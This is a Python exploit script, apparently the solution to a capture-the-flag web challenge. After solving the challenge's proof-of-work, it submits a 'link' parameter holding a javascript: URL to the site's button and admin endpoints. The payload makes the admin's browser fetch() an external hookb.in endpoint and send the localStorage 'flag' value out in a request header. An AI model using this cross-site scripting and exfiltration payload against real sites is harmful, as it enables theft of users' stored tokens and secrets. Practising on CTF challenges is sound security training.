import requests

import hashlib
import uuid
import binascii
import os
import sys

from time import sleep

def generate():
    return uuid.uuid4().hex[:4], uuid.uuid4().hex[:4]


def verify(prefix, suffix, answer, difficulty=6):
    hash = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()
    return hash.endswith("0"*difficulty)


def solve(prefix, suffix, difficulty):
    while True:
        test = binascii.hexlify(os.urandom(4)).decode()
        if verify(prefix, suffix, test, difficulty):
            return test


"""
if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()
"""
s = requests.Session()

host = 'https://fbg.rars.win:443/'
data = s.get(host + "pow").json()

print("Solving POW")
solution = solve(data['pref'], data['suff'], 5)
print(f"Solved: {solution}")

print( s.post(host + "pow", json={"answer": solution}).text )

"""
this is provided boilerplate ^^^
"""

def send_button_to(host, directory, sess):
    params = { "title" : '...', "link" : "javascript:fetch('https://hookb.in/ggg2p92p2XiG7Voo7z7P',{headers:{'Content-Type':window.localStorage.getItem('flag')}})" }

    print(f'[*] Response:')
    print( s.get( f'{host}{directory}', params=params , allow_redirects=True ).text )

print(f'[*] Cookies: {s.cookies}')
"""
print(f'[+] Creating button')

send_button_to(host, 'button' , s)
"""
print(f'[+] Sending request to {host}admin')

send_button_to(host, 'admin', s)

